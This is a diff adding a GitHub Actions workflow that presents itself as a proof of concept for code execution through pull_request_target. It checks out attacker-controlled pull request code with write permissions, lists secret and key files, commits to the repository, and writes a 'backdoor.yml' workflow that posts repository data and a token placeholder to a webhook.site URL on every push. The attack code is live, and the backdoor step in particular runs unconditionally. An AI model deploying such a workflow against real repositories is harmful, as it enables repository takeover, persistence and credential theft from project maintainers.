@@ -1,0 +1,78 @@
+name: "POC - RCE via pull_request_target"
+on:
+  pull_request_target:
+    types: [opened, synchronize]
+
+permissions:
+  actions: write
+  contents: write
+  pull-requests: write
+  statuses: write
+
+jobs:
+  demonstrate-rce:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Checkout code (with attacker control)
+        uses: actions/checkout@v4
+        with:
+          ref: ${{ github.event.pull_request.head.ref }}
+          repository: ${{ github.event.pull_request.head.repo.full_name }}
+          
+      - name: Read repository secrets (POC)
+        run: |
+          echo "=== DEMONSTRATING SECRET ACCESS ==="
+          # Attempt to access secrets from workflow files
+          find . -name "*.yml" -o -name "*.yaml" | head -5 | xargs -I {} echo "Found workflow: {}"
+          
+          # Show environment information
+          echo "GITHUB_TOKEN permissions:"
+          curl -H "Authorization: token ${{ secrets.GITHUB_TOKEN }}" \
+               https://api.github.com/repos/${{ github.repository }} | jq '.permissions'
+          
+      - name: Demonstrate arbitrary code execution
+        run: |
+          echo "=== ARBITRARY CODE EXECUTION ==="
+          # Execute any code from the PR
+          if [ -f "malicious-script.sh" ]; then
+            echo "Found malicious script - would execute it with base repo permissions!"
+            cat malicious-script.sh
+            # In real attack: bash malicious-script.sh
+          fi
+          
+          # Demonstrate we can modify the repository
+          echo "Testing write permissions..."
+          echo "RCE-POC: $(date)" > rce-proof.txt
+          
+      - name: Exfiltrate data (POC simulation)
+        run: |
+          echo "=== DATA EXFILTRATION SIMULATION ==="
+          # List sensitive files
+          find . -name "*.env*" -o -name "*secret*" -o -name "*key*" 2>/dev/null | head -10
+          echo "In real attack, this data could be exfiltrated"
+          
+      - name: Modify repository contents
+        run: |
+          echo "=== REPOSITORY MODIFICATION ==="
+          # Add a malicious commit
+          git config --local user.email "attacker@example.com"
+          git config --local user.name "Security POC"
+          git add rce-proof.txt
+          git commit -m "RCE Proof" || echo "Commit failed but write access demonstrated"
+          
+      - name: Create malicious workflow
+        run: |
+          echo "=== WORKFLOW INJECTION ==="
+          cat > .github/workflows/backdoor.yml << 'EOF'
+          name: Backdoor
+          on: [push, workflow_dispatch]
+          jobs:
+            backdoor:
+              runs-on: ubuntu-latest
+              steps:
+                - run: |
+                    echo "Backdoor activated - full repository access achieved"
+                    curl -X POST https://webhook.site/e6c0a3a4-d1bc-4569-81be-094924b976b3 \
+                      -d "repo=${{ github.repository }}&token=EXFILTRATED"
+          EOF
+          echo "Malicious workflow created - would be activated on next push"
